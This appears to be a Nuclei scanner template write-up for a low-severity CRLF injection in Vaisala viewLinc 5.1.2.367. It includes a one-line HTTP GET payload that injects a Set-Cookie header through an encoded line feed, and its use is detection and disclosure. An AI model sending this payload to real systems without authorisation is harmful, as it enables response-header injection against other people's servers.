# Nuclei Template: viewLinc 5.1.2.367 - Carriage Return Line Feed Attack
**Template ID:** viewlinc-crlf-injection
**Vulnerability Class:** CRLF Injection
**Severity:** Low
**Source:** Nuclei Template (`viewlinc-crlf-injection.yaml`)

## Vulnerability Information & PoC

## Description
viewLinc 5.1.2.367 (and sometimes 5.1.1.50) allows remote attackers to inject a carriage return line feed (CRLF) character into the responses returned by the product, which allows attackers to inject arbitrary HTTP headers into the response returned.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/%0ASet-Cookie:crlfinjection=crlfinjection
```

## References
- https://www.vaisala.com/en/products/systems/indoor-monitoring-systems/viewlinc-continuous-monitoring-system
